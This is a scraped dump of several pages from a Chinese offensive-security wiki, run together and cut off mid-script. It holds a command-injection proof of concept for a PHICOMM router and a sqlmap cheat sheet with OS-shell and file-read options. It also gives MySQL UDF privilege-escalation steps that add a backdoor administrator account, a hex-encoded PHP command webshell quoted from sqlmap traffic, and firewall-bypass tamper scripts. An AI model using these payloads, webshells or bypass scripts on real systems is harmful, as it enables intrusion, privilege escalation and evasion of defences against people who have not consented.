在系统工具中可执行命令 如图 感谢毒刺老哥提供文章 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-13 14:02:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/PHICOMM/1.html":{"url":"iot/PHICOMM/1.html","title":"（CVE-2019-19117）PHICOMM 远程代码执行","keywords":"","body":"（CVE-2019-19117）PHICOMM 远程代码执行 一、漏洞简介 通过修改HTTP post请求中的内容，在根shell上远程执行命令。 二、漏洞影响 PHICOMM K2(PSG1218) V22.5.9.163 三、复现过程 受影响的源代码文件：/usr/lib/lua/luci/controller/admin/autoupgrade.lua 受影响的函数：save（） 漏洞详情 首先，在通过Web登录身份验证，会话劫持漏洞或弱凭据破解攻击以获取访问权限后，向设备发送精心制作的数据包 curl -i -s -k -v -X'POST' -e \"http://192.168.2.1/cgi-bin/luci/;stok=xxx/xxx/xxx/xxx\" -b \"sysauth=4a2c4bdba5fb1273ce62759fd42dba42\" --data-binary \"mode=1&autoUpTime=02%3A05|reboot\" 'http://192.168.2.1/cgi-bin/luci/;stok=xxx/admin/xxx/xxx/xxx' 在此http数据包中，我们将要执行“重新引导”的命令添加到数据包内容中。 我们可以看到，将'autoUpTime'的值直接分配给变量，而无需检查该值是否被恶意修改，然后发送给服务器。 然后，服务器直接将数据附加到命令，而无需检查数据是否也被恶意修改，从而使攻击者想要执行的命令附加到该命令。 最后，路由器将执行命令“ reboot”，这将导致DoS。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-24 13:28:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/游览器插件/Hackbar.html":{"url":"Tools/游览器插件/Hackbar.html","title":"Hackbar","keywords":"","body":"Hackbar 介绍说明 https://hackbar.site/ 官方支持paypal、visa、btc、eth支付 下载地址 火狐游览器 https://addons.mozilla.org/en-US/firefox/addon/hackbartool/ 谷歌游览器 https://chrome.google.com/webstore/detail/hackbar/djmoeoifnlhjolebkehmpaocfnipknbh 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 00:42:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/游览器插件/Set Character Encoding.html":{"url":"Tools/游览器插件/Set Character Encoding.html","title":"Set Character Encoding","keywords":"","body":"Set Character Encoding 介绍说明 自定义网站编码格式的插件 下载地址 谷歌游览器 https://chrome.google.com/webstore/detail/set-character-encoding/bpojelgakakmcfmjfilgdlmhefphglae 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 11:03:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/游览器插件/Swichsharp.html":{"url":"Tools/游览器插件/Swichsharp.html","title":"Swichsharp","keywords":"","body":"Swichsharp 介绍说明 Swichsharp是一款可以自动切换代理的插件 目前已经升级为SwitchyOmega，Swichsharp已经不再更新。 下载地址 Swichsharp 谷歌游览器 https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm SwitchyOmega 火狐游览器 https://addons.mozilla.org/en-US/firefox/addon/switchyomega/ 谷歌游览器 https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN 备用下载地址 https://github.com/FelisCatus/SwitchyOmega/releases 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 12:56:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/游览器插件/User-Agent Switcher.html":{"url":"Tools/游览器插件/User-Agent Switcher.html","title":"User-Agent Switcher","keywords":"","body":"User-Agent Switcher 介绍说明 User-Agent Switcher 是一款可以模拟其他游览器访问页面的插件 目前支持 Chrome Internet Explorer iOS Android Windows Phone Firefox Opera Safari 您自定义的用户代理字符 下载地址 火狐游览器 https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/?src=search 谷歌游览器 https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 00:55:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/游览器插件/xss.html":{"url":"Tools/游览器插件/xss.html","title":"XssSniper","keywords":"","body":"XssSniper 介绍说明 一直以来，隐式输出的DomXSS漏洞难以被传统的扫描工具发现，而XssSniper是依托于Chrome浏览器的扩展，通过动态解析可以快速准确的发现DomXSS漏洞。 此外，本扩展不仅可以发现隐式输出的XSS，还可以发现显示输出的DomXSS，反射式XSS，自动寻找JSONP的XSS，以及检测SOME漏洞（同源方法执行）。 下载地址 谷歌游览器 https://chrome.google.com/webstore/detail/xsssniper/pnhekakhikkhloodcedfcmfpjddcagpi?hl=zh-CN 官方下载地址 https://0kee.360.cn/domXss/XssSniper.crx 使用说明 原理 XSS检测原理 本扩展采用了两种方法去检测DOMXSS。 第一种方法：FUZZ 这种检测方法误报率非常低，只要是检测出来的一定都是都是存在漏洞的。但是代价是漏报率也比较高。 具体来说是在当前页面中创建一个隐形的iframe，在这个iframe中采用不同字符组合截断的payload去fuzz当前页面中的每个url参数，以及location.hash参数。如果payload执行，说明漏洞一定存在。 第二种方法：监控js错误变化 如果xss存在方式比较隐蔽，或者需要非常复杂的字符组合来截断的话，payload是无法正常执行的，然而尽管如此，payload可能会引发一些js语法异常，扩展只需要检测这些异常就可以。然后提示用户错误位置，错误内容，错误的行数，让用户手工去 因此以这种方式检测XSS，漏报少，但是代价是误报较高。 两种检测方式相互结合，取长补短。 使用方法 打开控制面板 第一次使用的时候请手工更新一下策略，将测试目标填入列表中。tester并非是主动检测这些列表域名中的漏洞。而是在你浏览这些网站时，检测当前页面中的XSS漏洞。 所以，开启fuzz后，只需要正常浏览这些网站即可。 第一种报警方式：payload直接执行 如果在浏览过程中发现弹出了对话框，显示一个带有xss payload的url，如下图，说明该url可以触发XSS漏洞。 按下F12打开console控制台，测试过的URL都会在里面显示。将刚刚对话框中显示的url+payload复制出来即可。 第二种报警方式：payload使js抛出异常 如果在浏览页面时候右下角弹出如下告警，说明payload使js抛出了不同的异常。 此时打开F12打开控制台，依照图示找到异常内容和触发异常的payload，另外还可以找到抛出异常的文件和行号，方便调试 第三种告警：JSONP反射式XSS 若发现如下告警，说明页面中使用的jsonp存在xss漏洞。url已经在提示中给出。 第四种告警：SOME漏洞 当扩展发现当前页面中的参数在jsonp也出现时，就会给出以下告警，需要测试者手工确认页面参数能否影响jsonp的返回参数。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 12:44:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/游览器插件/cookie.html":{"url":"Tools/游览器插件/cookie.html","title":"Cookie-Editor","keywords":"","body":"Cookie-Editor 介绍说明 Cookie-Editor是一款可以自定义修改cookie的插件 下载地址 火狐游览器 火狐游览器 https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?src=search 谷歌游览器 https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 12:56:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/sqlmap参数说明.html":{"url":"Tools/Sqlmap/sqlmap参数说明.html","title":"Sqlmap参数说明","keywords":"","body":"Sqlmap常用语句 基础信息 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --current-user #获取当前用户名称 python sqlmap/sqlmap.py -u \"http://www.xxoo.com/news?id=1\" --current-db #获取当前数据库名称 python sqlmap/sqlmap.py -u \"http://www.xxoo.com/news?id=1\" --tables -D \"db_name\" #列表名 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --columns -T \"tablename\" users-D \"db_name\" -v 0 #列字段 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump -C \"column_name\" -T \"table_name\" -D \"db_name\" -v 0 #获取字段内容 信息内容 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --smart --level 3 --users # smart智能 level 执行测试等级 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbms \"Mysql\" --users # dbms 指定数据库类型 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --users #列数据库用户 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbs#列数据库 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --passwords #数据库用户密码 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --passwords-U root -v 0 #列出指定用户数据库密码 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump -C \"password,user,id\" -T \"tablename\" -D \"db_name\" --start 1 --stop 20 #列出指定字段，列出20条 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump-all -v 0 #列出所有数据库所有表 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --privileges #查看权限 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --privileges -U root #查看指定用户权限 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --is-dba -v 1 #是否是数据库管理员 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --roles #枚举数据库用户角色 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --udf-inject #导入用户自定义函数（获取系统权限！） python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump-all --exclude-sysdbs -v 0 #列出当前库所有表 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --union-cols #union 查询表记录 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --cookie \"COOKIE_VALUE\" #cookie注入 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" -b #获取banner信息 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --data \"id=3\" #post注入 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" -v 1 -f #指纹判别数据库类型 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --proxy\"http://127.0.0.1:8118\" #代理注入 python sqlmap/sqlmap.py -u \"http://url/news?id=1\"--string\"STRING_ON_TRUE_PAGE\" #指定关键词 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --sql-shell #执行指定sql命令 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --file /etc/passwd python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --os-cmd=whoami #执行系统命令 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --os-shell #系统交互shell python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --os-pwn #反弹shell python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --reg-read #读取win系统注册表 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbs-o \"sqlmap.log\" #保存进度 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbs -o \"sqlmap.log\" --resume #恢复已保存进度sqlmap -g \"google语法\" --dump-all --batch #google搜索注入点自动 跑出所有字段攻击实例 python sqlmap/sqlmap.py -u \"http://url/news?id=1&Submit=Submit\" --cookie=\"PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406\" --string=\"Surname\" --dbms=mysql --users --password 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-27 23:04:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/1.html":{"url":"Tools/Sqlmap/1.html","title":"Sqlmap udf提权过程","keywords":"","body":"sqlmap udf提权过程 0x01 UDF UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 0x02 windows下udf提权的条件 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\\plugin文件夹下/ 如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\\windows\\system32目录，在windows server 2000下放置在c:\\winnt\\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。 0x03 提权方法 如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\\plugin文件夹，然后将udf.dll文件导出到该目录。 /* sqlmap\\udf\\mysql\\windows\\32目录下存放着lib_mysqludf_sys.dll_ sqlmap\\udf\\mysql\\windows\\64目录下为64位的lib_mysqludf_sys.dll_ */ 首先进入到 sqlmap\\extra\\cloak\\cloak 目录下，执行命令： cloak.py -d -i D:\\sqlmap\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_ 解密之后会在当前目录下生成dll文件。 将dll文件复制到mysql的/lib/plugin目录下，执行 create function sys_exec returns string soname \"lib_mysqludf_sys.dll\"; 攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。 执行命令： select sys_eval(‘whoami’); /* 函数介绍： sys_eval，执行任意命令，并将输出返回。 sys_exec，执行任意命令，并将退出码返回。 sys_get，获取一个环境变量。 sys_set，创建或修改一个环境变量。 */ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 01:45:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/2.html":{"url":"Tools/Sqlmap/2.html","title":"Sqlmap udf提权原理","keywords":"","body":"slmap udf提权原理 0x01-udf是什么？ udf = 'user defined function'，即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就象使用本地MYSQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于‘mysql/lib/plugin’目录下，文件后缀为‘.dll’，常用c语言编写。 0x02-如何使用udf? 假设我的udf文件名为‘udf.dll’，存放在Mysql根目录(通过select @@basedir可知)的‘lib/plugin’目录下。在udf中，我定义了名为sys_eval的mysql函数，可以执行系统任意命令。如果我现在就打开mysql命令行，使用select sys_eval('dir');的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把‘udf.dll’放到了某个文件夹里，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。 不要慌，看看实例用法： CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; 只有两个变量，一个是function_name（函数名），我们想引入的函数是sys_eval。还有一个变量是shared_library_name（共享包名称），即‘udf.dll’。 至此我们已经引入了sys_eval函数，下面就是使用了。 这个函数用于执行系统命令，用法如下： select sys_eval('cmd command'); 0x03-使用udf提权 现在我们已经知道了udf是什么，以及如何引入udf。下面我们要关注的就是提权了。其实到这里，提权已经结束了，因为对于sys_eval()函数，其中的指令是直接以管理员的权限运行的，所以这也就是最高权限了。 下面来整理一下思路： 1、将udf文件放到指定位置（Mysql>5.1放在Mysql根目录的lib\\plugin文件夹下） 2、从udf文件中引入自定义函数(user defined function) 3、执行自定义函数 先看第一步，拿到一个网站的webshell之后，在指定位置创建udf文件。如何创建？先别忘了，现在连源udf文件都没有。sqlmap中有现成的udf文件，分为32位和64位，一定要选择对版本，否则会显示：Can't open shared library 'udf.dll'。获取sqlmap的udf请看链接：MySQL 利用UDF执行命令 然后将获得的udf.dll文件转换成16进制，一种思路是在本地使用mysql函数hex： SELECT hex(load_file(0x433a5c5c55736572735c5c6b61316e34745c5c4465736b746f705c5c6c69625f6d7973716c7564665f7379732e646c6c)) into dumpfile 'C:\\\\Users\\\\ka1n4t\\\\Desktop\\\\gg.txt'; load_file中的十六进制是C:\\Users\\ka1n4t\\Desktop\\lib_mysqludf_sys.dll 此时gg.txt文件的内容就是udf文件的16进制形式。 接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。 1.CREATE TABLE udftmp (c blob); //新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。 2. INSERT INTO udftmp values(unhex('udf文件的16进制格式')); //在udftmp中写入udf文件内容 3. SELECT c FROM udftmp INTO DUMPFILE 'H:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll'; //将udf文件内容传入新建的udf文件中，路径根据自己的@@basedir修改 //对于mysql小于5.1的，导出目录为C:\\Windows\\或C:\\Windows\\System32\\ 上面第三步，mysql5.1以上的版本是默认没有plugin目录的，网上有说可以使用ntfs数据流创建： select test into dumpfile 'H:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION'; 但是我本地测试一直没有成功。后来又在网上看了很多，都是用这种方法，看来是无解了。在t00ls上也有人说数据流从来没有成功过，所以说mysql5.1以上的提权能否成功还是个迷。 为了演示，在这里我是手工创建了个plugin目录(ps: 勿喷啦，我用的phpstudy环境，重新安装一个mysql的话有可能会冲突，所以就没搞，毕竟原理都一样)。 继续，到这儿如果没有报错的话就说明已经在目标主机上成功生成了udf文件。下面要导入udf函数： 1. DROP TABLE udftmp; //为了删除痕迹，把刚刚新建的udftmp表删掉 2. CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; //导入udf函数 导入成功的话就可以使用了： SELECT sys_eval('ipconfig'); 返回网卡信息 附几个常用的cmd指令，用于添加一个管理员用户： net user ka1n4t ka1n4t~!@ /add //添加新用户：ka1n4t，密码为ka1n4t~!@ net localgroup administrators ka1n4t /add //将ka1n4t添加至管理员分组 小节 1、提权原理： 利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库 2、数据库版本为 5.0 以下的： 如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导出到 C:\\Winnt\\udf.dll 下。 如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\\Windows\\udf.dll 下。 3、数据库版本为 5.1 以上的： 我们则需要将 dll 文件导出到 mysql 安装目录的 lib\\plugin\\ 下，才能创建自定义函数。注：如果没有 plugin 目录，我们可以进行手动创建！ 4、udf提权的两种姿势 1：通过大马的MySQL提权功能，成功导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd 命令，来执行提权操作。注：在此之前，我们应执行版本查看语句，来确认当前MySQL的版本信息！ net user secist secist.com /add net localgroup administrators secist /add 2：直接在目标服务器上传 udf.php 此类的提权脚本提权。 方法是一样的，先导出 dll 文件到正确位置。 再在自定义SQL语句执行框内，执行以下命令，来创建调用函数并进行提权！ 1. create function cmdshell returns string soname ‘udf.dll’; 创建 cmdshell 调用函数 2. select cmdshell(‘net user secist secist.com /add’); 添加用户 3. select cmdshell(‘net localgroup administrators secist /add’); 将用户加到管理组 4. drop function cmdshell; 删除函数 5. delete from mysql.func where name='cmdshell'; 删除函数 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 01:51:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/3.html":{"url":"Tools/Sqlmap/3.html","title":"Sqlmap os-shell原理","keywords":"","body":"sqlmap os-shell原理 0x01 流程 i. 简单判断 从截图显示中，可以看到有以下几步 1、选择 web 应用语言 2、发现（提供）一个可写的绝对路径 3、顺序（不同方法）上传tmpujout.php、tmpbvwsp.php两个文件 ii. 流量分析 主要的http流量有 4 条，第 2 条根据@@version_compile_os首字母判断操作系统，第 4 条开始写入文件 1. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x34,1024)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- MBKa&Submit=Submit 2. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- EJbF&Submit=Submit 3. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x31,451)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- LNMk&Submit=Submit 4. id=1' LIMIT 0,1 INTO OUTFILE '/var/www/html/hackable/uploads/tmpujout.php' LINES TERMINATED BY 0x3c3f7068702024633d245f524551554553545b22636d64225d3b407365745f74696d655f6c696d69742830293b4069676e6f72655f757365725f61626f72742831293b40696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b247a3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b69662821656d70747928247a29297b247a3d707265675f7265706c61636528272f5b2c205d2b2f272c272c272c247a293b247a3d6578706c6f646528272c272c247a293b247a3d61727261795f6d617028277472696d272c247a293b7d656c73657b247a3d617272617928293b7d24633d24632e2220323e26315c6e223b66756e6374696f6e206628246e297b676c6f62616c20247a3b72657475726e2069735f63616c6c61626c6528246e29616e6421696e5f617272617928246e2c247a293b7d69662866282773797374656d2729297b6f625f737461727428293b73797374656d282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c736569662866282770726f635f6f70656e2729297b24793d70726f635f6f70656e2824632c617272617928617272617928706970652c72292c617272617928706970652c77292c617272617928706970652c7729292c2474293b24773d4e554c4c3b7768696c65282166656f662824745b315d29297b24772e3d66726561642824745b315d2c353132293b7d4070726f635f636c6f7365282479293b7d656c73656966286628277368656c6c5f657865632729297b24773d7368656c6c5f65786563282463293b7d656c736569662866282770617373746872752729297b6f625f737461727428293b7061737374687275282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c7365696628662827706f70656e2729297b24783d706f70656e2824632c72293b24773d4e554c4c3b69662869735f7265736f7572636528247829297b7768696c65282166656f6628247829297b24772e3d66726561642824782c353132293b7d7d4070636c6f7365282478293b7d656c7365696628662827657865632729297b24773d617272617928293b657865632824632c2477293b24773d6a6f696e28636872283130292c2477292e636872283130293b7d656c73657b24773d303b7d7072696e7420223c7072653e222e24772e223c2f7072653e223b3f3e-- -&Submit=Submit 之后 sqlmap 按路径尝试去访问文件tmpujqbu.php，通过 POST 上传后门文件tmpbzhga.php iii. 文件内容解析 可以看到tmpujqbu.php中的内容就是一个简单的文件上传，并将目标文件权限设置为 0755，注意这个文件生成利用的LINES TERMINATED BY，所以前面会带有之前 sql 执行的结果（这里就是admin admin） tmpujqbu.php admin admin sqlmap file uploaderto directory: \"; } ?> 而tmpbzhga.php可以看到就是一个标准的用于执行系统命令的后门脚本 // tmpbzhga.php &1\\n\"; function f($n) { global $z; return is_callable($n) and !in_array($n, $z); } if (f('system')) { ob_start(); system($c); $w = ob_get_contents(); ob_end_clean(); } elseif (f('proc_open')) { $y = proc_open($c, array( array( pipe, r ) , array( pipe, w ) , array( pipe, w ) ) , $t); $w = NULL; while (!feof($t[1])) { $w.= fread($t[1], 512); } @proc_close($y); } elseif (f('shell_exec')) { $w = shell_exec($c); } elseif (f('passthru')) { ob_start(); passthru($c); $w = ob_get_contents(); ob_end_clean(); } elseif (f('popen')) { $x = popen($c, r); $w = NULL; if (is_resource($x)) { while (!feof($x)) { $w.= fread($x, 512); } } @pclose($x); } elseif (f('exec')) { $w = array(); exec($c, $w); $w = join(chr(10) , $w) . chr(10); } else { $w = 0; } print \"\" . $w . \"\"; ?> 访问并执行ls命令 Q&A 1、原理简述 就是简单的上传一个 cmd shell 2、为什么要分两步呢? 不知道，明明可以直接一步上传 3、使用--os-shell需要的条件 FILE 权限 可写的结对路径 PHP GPC off 4、–os-shell 退出后会发生什么 会调用后门脚本删除上传文件后，进行自删除 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 01:56:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/sqlmap+burpsuit辅助批量注入验证/1.html":{"url":"Tools/sqlmap+burpsuit辅助批量注入验证/1.html","title":"sqlmap+burp辅助批量注入验证","keywords":"","body":"SleuthQL https://github.com/ianxtianxt/SleuthQL 0x01 SleuthQL介绍 SleuthQL是基于python3所开发的一款，用于批量爬行站点可能存在sql的地址。并且可以配合burp+sqlmap进行批量注入。 简单的说就是用burp采集网站路径以及页面，sqlmap跑全部可能存在uid注入的接口。 0x02 使用方法 参考参数： Options: -h, --help show this help message and exit -d DOMAINS, --domains=DOMAINS Comma separated list of domains to analyze. i.e.: google.com,mozilla.com,rhinosecuritylabs.com -f PROXY_XML, --xml=PROXY_XML Burp proxy history xml export to parse. Must be base64 encoded. -v, --verbose Show verbose errors that occur during parsing of the input XML. 1、首先先用burp爬行整个网站 2、接下来直接执行py python3 sleuthql.py -d www.0-sec.org -f xxx.com 这里会以txt的形式保存到本地 采用sqlmap进行批量测试 find . -name \"*.txt\" -exec sqlmap --batch -r {} --tables mysql \\; 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 02:02:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap tamper/3.html":{"url":"Tools/Sqlmap tamper/3.html","title":"sqlmap tamper速查梳理","keywords":"","body":"sqlmap tamper 速查梳理 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-19 13:17:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap tamper/1.html":{"url":"Tools/Sqlmap tamper/1.html","title":"bypass d盾tamper","keywords":"","body":"sqlmap bypass d盾 tamper 一 #!/usr/bin/env python from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): \"\"\" BYPASS Ddun \"\"\" retVal = payload if payload: retVal = \"\" quote, doublequote, firstspace = False, False, False for i in xrange(len(payload)): if not firstspace: if payload[i].isspace(): firstspace = True retVal += \"/*DJSAWW%2B%26Lt%3B%2B*/\" continue elif payload[i] == '\\'': quote = not quote elif payload[i] == '\"': doublequote = not doublequote elif payload[i] == \" \" and not doublequote and not quote: retVal += \"/*DJSAWW%2B%26Lt%3B%2B*/\" continue retVal += payload[i] return retVal 二 需改修改url #@author:九世 #@time:2019/11/15 #@file:bypass.py from gevent import monkey;monkey.patch_all() from multiprocessing import Process from colorama import init,Fore import gevent import requests import time import asyncio import string init(wrap=True) class BypassDog(object): def __init__(self): self.data=string.digits+'!' #定义内容 self.payload='http://192.168.241.158/sql.php?id=0%20union%20select%201,2' self.ybs=[] self.djcs=[] self.xcs=[] self.calc=0 self.calc2=0 self.calc3=0 self.huan=' ' self.dr='' self.r='' def reqts(self,da): jg=self.payload.replace('%20','/*{}*/'.format(da)) try: rqt=requests.get(url=jg,headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'}) if not '网站防火墙' in rqt.text and not 'NULL' in rqt.text: print(Fore.GREEN+'[+] '+Fore.WHITE+' Bypass Dog url:{}'.format(jg)) print(jg,file=open('test.txt','a',encoding='utf-8')) exit() else: print(Fore.RED+'[-] '+Fore.WHITE+' Bypass Dog fuck url:{}'.format(jg)) except: pass def xc(self,rw): for g in rw: self.xcs.append(gevent.spawn(self.reqts,g)) gevent.joinall(self.xcs) self.xcs.clear() def djc(self): for u in self.ybs: if self.calc==100: p=Process(target=self.xc,args=(self.djcs,)) p.start() self.calc=0 self.djcs.clear() time.sleep(0.01) #0.01 CPU低于50% 0.005CPU低于70 0.003CPU低于95，根据内容数量来手动设置是否需要延时 self.djcs.append(u) self.calc+=1 if len(self.djcs)>0: p = Process(target=self.xc, args=(self.djcs,)) p.start() self.calc = 0 self.djcs.clear() async def yb(self): for g in range(1,len(self.data)+1): while True: if self.calc3>g: gd=self.dr+' pod={};self.ybs.append(pod);self.calc2+=1\\n{}' \\ 'if self.calc2==100:\\n{}' \\ ' self.djc()\\n{}self.calc2=0\\n{}self.ybs.clear()\\n' \\ 'if len(self.ybs)>0:\\n' \\ ' self.djc();self.calc2=0;self.ybs.clear()'.format(self.r.rstrip('+'),self.huan+' ',self.huan+' ',self.huan+' '+' ',self.huan+' '+' ') exec(gd) self.calc3=0 self.huan=' ' self.dr='' break else: self.dr+=\"for s{} in self.data:\\n{}\".format(self.calc3,self.huan) self.r+='s{}+'.format(self.calc3) self.calc3+=1 self.huan+=' ' if __name__ == '__main__': obj=BypassDog() loop=asyncio.get_event_loop() tk=loop.create_task(obj.yb()) loop.run_until_complete(tk) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-28 11:39:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap tamper/2.html":{"url":"Tools/Sqlmap tamper/2.html","title":"bypass 云锁tamper","keywords":"","body":"sqlmap bypass 云锁tamper 只支持用union查询来过的，其他的测试语句会被云锁报警，这里问下大佬sqlmap能不能指定union来测试。。 这个os-shell也可以写出shell脚本，但是还后续执行命令会被云锁报警 #!/usr/bin/env python \"\"\" Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file 'LICENSE' for copying permission \"\"\" import re 